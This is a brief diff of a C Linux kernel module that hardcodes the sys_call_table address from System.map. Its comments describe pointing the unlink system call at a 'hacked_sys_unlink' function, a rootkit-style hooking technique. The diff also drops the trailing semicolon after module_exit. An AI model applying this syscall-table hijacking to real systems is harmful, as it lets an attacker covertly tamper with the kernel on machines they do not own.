@@ -21,8 +21,7 @@ static int _ _init my_init (void)
 {
         /*obtain sys_call_table from hardcoded value
         we found in System.map*/
-      //*(long *)&sys_call_table=0xc044fd00;
-        *(long *)&sys_call_table=9b29c060;
+        *(long *)&sys_call_table=0xc044fd00;
         
         /*store original location of sys_unlink. Alter sys_call_table
         to point _ _NR_unlink to our hacked_sys_unlink*/
@@ -39,4 +38,4 @@ static void my_exit (void)
 }       
 
 module_init(my_init);
-module_exit(my_exit);
+module_exit(my_exit)
